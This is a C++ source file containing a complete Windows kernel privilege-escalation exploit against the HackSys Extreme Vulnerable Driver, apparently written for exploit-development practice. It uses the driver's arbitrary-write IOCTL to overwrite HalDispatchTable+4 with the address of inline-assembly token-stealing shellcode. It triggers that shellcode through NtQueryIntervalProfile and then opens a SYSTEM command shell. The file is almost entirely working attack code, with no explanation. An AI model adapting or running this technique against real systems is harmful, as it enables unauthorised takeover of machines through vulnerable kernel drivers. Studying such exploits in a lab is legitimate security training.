#include <iostream>
#include <Windows.h>
#include <Psapi.h>
void pwn() {
	__asm {
		pushad
		xor eax, eax
		mov eax, fs:[eax + 124h]
		mov eax, [eax + 050h]
		mov ecx, eax
		mov edx, 4
	SearchSystemPID :
			mov eax, [eax + 0b8h]
			sub eax, 0b8h
			cmp[eax + 0b4h], edx
			jne SearchSystemPID
		mov edx, [eax + 0f8h]
		mov[ecx + 0f8h], edx
		popad
	}
}

LPVOID GetDriverBase(CHAR* targetDriver) {
#define MAX_DRIVER 1024
	LPVOID lpImageBase[MAX_DRIVER] = { 0 };
	DWORD cb = MAX_DRIVER * sizeof(LPVOID);
	DWORD lNeeded = 0;
	CHAR lpFilename[1024] = { 0 };
	int ret = -1;
	ret = EnumDeviceDrivers(lpImageBase, cb, &lNeeded);
	if (!ret) {
		std::cout << "[x] Failed to execute EnumDeviceDrivers\n";
		return NULL;
	}

	for (int i = 0; i < MAX_DRIVER; i++) {
		memset(lpFilename, 0, sizeof(lpFilename));
		ret = GetDeviceDriverBaseNameA(lpImageBase[i], lpFilename, 1024);
		if (!ret) continue;
		if (!strcmp(lpFilename, targetDriver)) {
			std::cout << "[+] Find the " << targetDriver << " Driver Base Address\n";
			return lpImageBase[i];
		}
	}
	std::cout << "[x] Failed to find target driver base address\n";
	return NULL;
}

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);
static void cmd() {
	DWORD interVal = 0;
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
	printf("[+] NtQueryIntervalProfile address: %#x\n", NtQueryIntervalProfile);
	NtQueryIntervalProfile(1314, &interVal);
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) {
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

int main()
{
	std::cout << "[+] ArbitraryWrite!\n";
	DWORD retLength = 0;
	HMODULE hModule = NULL;
	DWORD ntkrnlpa_base = 0;
	DWORD HalDispatchTable = 0;
	DWORD Where = 0;
	DWORD inBuffer[2] = { 0 };
	DWORD shellcode_addr = (DWORD)&pwn;
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	ntkrnlpa_base = (DWORD)GetDriverBase((CHAR*)"ntkrnlpa.exe");
	if (!ntkrnlpa_base) goto ERR;
	printf("[+] ntkrnlpa_base: %#x\n", (void*)ntkrnlpa_base);

	hModule = LoadLibraryA("ntkrnlpa.exe");
	if (!hModule) {
		std::cout << "[x] Failed to load ntkrnlpa.exe\n";
		goto ERR;
	}

	HalDispatchTable = (DWORD)GetProcAddress(hModule, "HalDispatchTable");
	if (!HalDispatchTable) {
		std::cout << "[x] Failed to get the address of HalDispatchTable\n";
		goto ERR;
	}
	HalDispatchTable += 4;
	printf("[+] HalDispatchTable+4: %#x\n", (void*)HalDispatchTable);

	Where = ntkrnlpa_base + HalDispatchTable - (DWORD)hModule;
	printf("[+] Where: %#x\n", (void*)Where);

	inBuffer[0] = (DWORD)&shellcode_addr;
	inBuffer[1] = Where;
	printf("[+] shellcode address: %#x\n", (DWORD)&pwn);
	DeviceIoControl(hDevice, 0x22200B, inBuffer, 8, NULL, 0, &retLength, NULL);
	cmd();
	//	system("pause");
	return 0;
ERR:
	return -1;
}
